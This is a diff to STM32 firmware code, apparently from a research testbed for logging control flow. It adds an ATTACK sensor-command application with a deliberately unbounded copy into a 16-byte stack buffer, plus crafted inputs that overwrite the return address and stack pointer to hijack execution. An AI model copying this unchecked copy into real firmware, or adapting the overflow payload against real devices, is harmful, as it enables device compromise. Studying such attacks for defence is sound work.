@@ -2,6 +2,7 @@
 #include "application.h"
 #include "math.h"
 #include "stm32l5xx_hal_tim.h"
+#include "core_cm33.h"
 
 #if APP_SEL == SORT
 // Source: https://www.geeksforgeeks.org/bubble-sort/
@@ -39,13 +40,13 @@ void bubbleSort(int arr[], int n)
 }
  
 // // Random lists for testing
-int arr[100] = {54, 77, 91, 1, 50, 96, 93, 20, 87, 26, 23, 86, 83, 49, 64, 36, 65, 4, 74, 55, 30, 72, 9, 31, 13, 17, 3, 68, 70, 48, 63, 18, 85, 60, 71, 88, 41, 89, 25, 47, 12, 57, 43, 58, 81, 99, 6, 42, 95, 84, 29, 7, 14, 80, 24, 27, 11, 5, 37, 53, 78, 40, 62, 28, 59, 66, 32, 8, 69, 79, 52, 10, 2, 39, 21, 44, 38, 73, 46, 90, 76, 56, 16, 15, 34, 82, 100, 33, 35, 22, 98, 94, 45, 92, 51, 67, 75, 19, 97, 6};
-// int arr[100] = {19, 53, 26, 88, 30, 28, 22, 76, 71, 83, 31, 16, 84, 73, 7, 93, 64, 31, 42, 82, 20, 37, 1, 1, 2, 3, 55, 36, 12, 17, 49, 36, 100, 93, 17, 82, 39, 9, 65, 1, 1, 52, 61, 11, 6, 53, 70, 21, 91, 19, 29, 28, 94, 89, 89, 54, 42, 49, 71, 19, 35, 3, 19, 6, 26, 29, 6, 57, 99, 79, 50, 63, 80, 33, 45, 46, 20, 57, 32, 5, 3, 23, 23, 72, 62, 73, 50, 26, 75, 24, 64, 31, 11, 6, 42, 57, 73, 5, 5, 54};
+// int arr[100] = {54, 77, 91, 1, 50, 96, 93, 20, 87, 26, 23, 86, 83, 49, 64, 36, 65, 4, 74, 55, 30, 72, 9, 31, 13, 17, 3, 68, 70, 48, 63, 18, 85, 60, 71, 88, 41, 89, 25, 47, 12, 57, 43, 58, 81, 99, 6, 42, 95, 84, 29, 7, 14, 80, 24, 27, 11, 5, 37, 53, 78, 40, 62, 28, 59, 66, 32, 8, 69, 79, 52, 10, 2, 39, 21, 44, 38, 73, 46, 90, 76, 56, 16, 15, 34, 82, 100, 33, 35, 22, 98, 94, 45, 92, 51, 67, 75, 19, 97, 6};
+int arr[100] = {19, 53, 26, 88, 30, 28, 22, 76, 71, 83, 31, 16, 84, 73, 7, 93, 64, 31, 42, 82, 20, 37, 1, 1, 2, 3, 55, 36, 12, 17, 49, 36, 100, 93, 17, 82, 39, 9, 65, 1, 1, 52, 61, 11, 6, 53, 70, 21, 91, 19, 29, 28, 94, 89, 89, 54, 42, 49, 71, 19, 35, 3, 19, 6, 26, 29, 6, 57, 99, 79, 50, 63, 80, 33, 45, 46, 20, 57, 32, 5, 3, 23, 23, 72, 62, 73, 50, 26, 75, 24, 64, 31, 11, 6, 42, 57, 73, 5, 5, 54};
 // int arr[100] = {26, 54, 50, 41, 23, 20, 87, 1, 45, 30, 90, 43, 93, 16, 22, 30, 30, 48, 92, 73, 89, 33, 56, 18, 81, 19, 20, 20, 40, 53, 44, 94, 84, 2, 71, 92, 81, 76, 63, 62, 45, 54, 31, 60, 11, 27, 79, 18, 67, 60, 75, 69, 20, 90, 88, 7, 50, 17, 2, 31, 12, 27, 10, 100, 52, 51, 14, 54, 81, 23, 87, 83, 18, 96, 93, 11, 18, 41, 62, 20, 9, 8, 77, 85, 50, 41, 45, 55, 66, 7, 54, 92, 76, 74, 23, 45, 36, 65, 29, 38};
 // int arr[100] = {37, 96, 2, 14, 40, 10, 32, 88, 44, 23, 21, 53, 42, 82, 70, 73, 70, 10, 66, 1, 80, 45, 17, 17, 93, 40, 99, 45, 19, 1, 10, 63, 41, 26, 19, 17, 41, 27, 33, 9, 50, 44, 19, 80, 98, 51, 37, 92, 21, 10, 2, 9, 14, 38, 16, 54, 71, 24, 100, 75, 30, 13, 98, 68, 27, 61, 94, 13, 35, 39, 60, 39, 53, 2, 97, 85, 10, 64, 25, 89, 85, 19, 96, 32, 74, 84, 24, 5, 97, 57, 81, 18, 72, 52, 26, 64, 11, 33, 41, 38};
 // int arr[100] = {83, 80, 20, 8, 43, 93, 3, 4, 59, 25, 16, 69, 13, 84, 12, 85, 23, 94, 58, 45, 15, 56, 22, 25, 70, 66, 12, 63, 53, 72, 96, 24, 59, 61, 58, 88, 90, 1, 74, 51, 51, 83, 46, 79, 49, 61, 36, 53, 50, 87, 92, 60, 54, 92, 90, 19, 23, 23, 26, 31, 3, 99, 93, 18, 79, 23, 41, 75, 61, 38, 14, 48, 49, 23, 55, 89, 85, 92, 12, 52, 94, 31, 21, 65, 14, 99, 3, 50, 85, 53, 27, 41, 50, 83, 47, 69, 58, 94, 79, 97};
 
-int n = 100; //sizeof(arr) / sizeof(arr[0]);
+int n = 25; //sizeof(arr) / sizeof(arr[0]);
 void application()
 {
     bubbleSort(arr, n);
@@ -54,6 +55,7 @@ void application()
     // for(i=0; i<n; i++){
     //     SECURE_record_output_data(arr[i]);
     // }
+    SECURE_record_output_data(arr[0]);
 }
 #endif
 
@@ -855,18 +857,21 @@ void application() {
 
 #if APP_SEL == BASIC
 
-uint32_t start_time = 0;
-uint32_t end_time = 0;
-uint32_t nsc_time = 0;
+
 uint32_t test = 0;
+
+void (*fun)();
+
+void fun1() { test = 1; } 
+void fun2() { test = 2; } 
+
 void application(){
-    test = 1;
-    start_time = HAL_GetTick();
-    for(int i=0; i<100; i++);
-    end_time = HAL_GetTick();
-    nsc_time += end_time - start_time;
-    SECURE_record_output_data(test);
-    SECURE_record_output_data(nsc_time);
+    if (test == 1){
+        fun = fun1;    
+    } else{
+        fun = fun2;
+    }
+    fun();
 }
 
 #endif
@@ -1130,11 +1135,261 @@ void application(){
     // for(int i=0; i<MAX_READINGS; i++){
     //     ult_vec += getUltrasonicReading()/MAX_READINGS;
     // }
-    
+
     ult_vec = getUltrasonicReading();
 
     SECURE_record_output_data(ult_vec);
+    SECURE_record_output_data(read_val);
 
+}
+#endif
+
+#if APP_SEL == ATTACK
+
+// --------------------- Main ------------------//
+#define MAX_READINGS        83
+#define MAX_DURATION        1000
+#define cmd_ult             'u'
+#define cmd_temp_hum        't'
+#define cmd_all             'a'
+
+// Ultrasonic only
+// char input[4] = {'u', 0, 16, ':'};
+// Temperature and humidity
+// uint8_t input[4] = {'t', 0, 2, ':'};
+// All
+// char input[13] = {'a', 0, 1, 'u', 0, 16, 't', 0, 2, 'h', 0, 2, ':'};
+// Attack -- an "all" request modified to run only ultrasonic 
+// overwrites: return address to 0x804077e, stack pointer to 0x2003ffe8                                                 8040812 
+// char input[25] = {'a', 0, 1, 'u', 0, 16, 't', 0, 2, 'h', 0, 2, 'a','a','a','a', 0xe8, 0xff, 0x03, 0x20, 0x13, 0x08, 0x04, 0x08, ':'};
+//                                                                                                                                                             8040694+1
+//                                                                                                                                                             80405ce+1
+char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b', 0xf0, 0xff, 0x03, 0x20, 0xcf, 0x05, 0x04, 0x08, ':'};
+
+uint32_t data[4] = {0,0,0,0};
+uint8_t temp_data[5] = {0,0,0,0,0};
+uint8_t valid_reading = 0;
+
+int ult_runs;
+int temp_runs;
+int hum_runs;
+int seq_runs;
+int runs;
+
+extern __IO uint32_t uwTick;
+
+void delay(unsigned int us){
+    SECURE_new_log_entry();
+    // uint32_t start = uwTick;
+    // while(uwTick - start < us);
+    for(int i=0; i<us; i++);
+}
+
+void read_data(void){
+    SECURE_new_log_entry();
+    uint8_t counter = 0;
+    uint16_t j = 0, i;
+
+    // pull signal high & delay
+    GPIOA->BRR = (uint32_t)GPIO_PIN_8;
+    delay(250);
+
+    /// pull signal low for 20us
+    GPIOA->BSRR = (uint32_t)GPIO_PIN_8;
+    delay(20);
+
+    // pull signal high for 40us
+    GPIOA->BRR = (uint32_t)GPIO_PIN_8;
+    delay(40);
+
+    //read timings
+    for(i=0; i<MAX_READINGS; i++){
+
+        counter += (GPIOA->IDR & GPIO_PIN_8) >> 8;
+
+        // ignore first 3 transitions
+        if ((i >= 4) && ( (i & 0x01) == 0x00)) {
+
+            // shove each bit into the storage bytes
+            temp_data[j >> 3] <<= 1;
+            if (counter > 6){
+
+                data[j >> 3] |= 1;
+            }
+
+            j++;
+        }
+
+    }
+    // check we read 40 bits and that the checksum matches
+    if ((j >= 40) && (temp_data[4] == ((temp_data[0] + temp_data[1] + temp_data[2] + temp_data[3]) & 0xFF)) ) {
+
+        valid_reading = 1;
+    } else {
+
+        valid_reading = 0;
+    }
+}
+
+uint16_t get_temperature(void){
+    SECURE_new_log_entry();
+    read_data();
+
+    uint16_t t = temp_data[2];
+    t |= (temp_data[3] << 8);
+    return t;
+}
+
+uint16_t get_humidity(void){
+    SECURE_new_log_entry();
+    read_data();
+
+    uint16_t h = temp_data[0];
+    h |= (temp_data[1] << 8);
+    return h;
+}
+
+uint32_t pulseIn(void){
+    SECURE_new_log_entry();
+    uint32_t duration = 0;
+
+    for(int i=0; i < MAX_DURATION; i++){
+        duration += (GPIOA->IDR & GPIO_PIN_9) >> 8;
+    } 
+
+    return duration;
+ }
+
+long getUltrasonicReading(){
+    SECURE_new_log_entry();
+    // Set as output and Set signal low for 2us
+    GPIOA->BSRR = (uint32_t)GPIO_PIN_9;
+
+    delay(2);
+
+    // Set signal high for 5 us
+    GPIOA->BRR = (uint32_t)GPIO_PIN_9;
+
+    delay(5);
+
+    // Set signal low
+    GPIOA->BSRR = (uint32_t)GPIO_PIN_9;
+
+    // Set as input and read for duration
+    unsigned long duration = pulseIn();
+
+    return duration;
+}
+
+long run_ultrasonic(int runs){
+    SECURE_new_log_entry();
+    int i;
+    long total = 0;
+    for(i=0; i<runs; i++){
+        total += getUltrasonicReading()/runs;
+    }
+    return total;
+}
+
+long run_temperature(int runs){
+    SECURE_new_log_entry();
+    int i;
+    long total = 0;
+    for(i=0; i<runs; i++){
+        total += get_temperature()/runs;
+    }
+    return total;
+}
+
+long run_humidity(int runs){
+    SECURE_new_log_entry();
+    int i;
+    long total = 0;
+    for(i=0; i<runs; i++){
+        total += get_humidity()/runs;
+    }
+    return total;
+}
+
+uint32_t send_data; ///2003ffc0
+void read_command(char * msg, char * input){
+    SECURE_new_log_entry();
+    while(*input != ':'){
+        *msg = *input;
+        // SECURE_record_output_data(*input);
+        // SECURE_record_output_data(*msg);/
+        msg++;
+        input++;
+    }
+}
+
+char cmd;
+void process_command(){
+    char msg[16] = {'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a'};
+    read_command(msg, input);
+
+    switch(msg[0]){
+        case cmd_ult:
+            ult_runs = (msg[1] << 8) | msg[2];
+            break;
+        case cmd_temp_hum:
+            temp_runs = (msg[1] << 8) | msg[2];
+            SECURE_record_output_data(temp_runs);
+            hum_runs = (msg[4] << 8) | msg[5];
+            SECURE_record_output_data(hum_runs);
+            break;
+        case cmd_all:
+            seq_runs  = (msg[1]  << 8) | msg[2];
+            ult_runs  = (msg[4]  << 8) | msg[5];
+            temp_runs = (msg[7]  << 8) | msg[8];
+            hum_runs  = (msg[10] << 8) | msg[11];
+        default:
+            break;
+    }
+    cmd = msg[0];
+    SECURE_record_output_data(cmd);
+    // return msg[0];
+}
+
+int (*sensor_action)(char);
+
+int record_output_data(char data){
+    SECURE_new_log_entry();
+    return data^0xff;
+}
+
+void application(void)
+{
+
+    process_command();
+
+    switch(cmd){
+        case cmd_ult:
+            runs = record_output_data(cmd_ult);
+            // data[0] = run_ultrasonic(ult_runs);
+            sensor_action = &run_ultrasonic;
+            runs = ult_runs;
+            break;
+        case cmd_temp_hum:
+            runs = record_output_data(cmd_temp_hum);
+            // data[1] = run_temperature(temp_runs);
+            // data[2] = run_humidity(hum_runs);
+            sensor_action = &run_temperature;
+            runs = temp_runs;
+            break;
+        case cmd_all:
+            runs = record_output_data(cmd_all);
+            // data[0] = run_ultrasonic(ult_runs);
+            // data[1] = run_temperature(temp_runs);
+            // data[2] = run_humidity(hum_runs);
+            sensor_action = &run_humidity;
+            runs = hum_runs;
+            break;
+        default:
+            break;
+    }
+
+    sensor_action(runs);
 }
 #endif
 
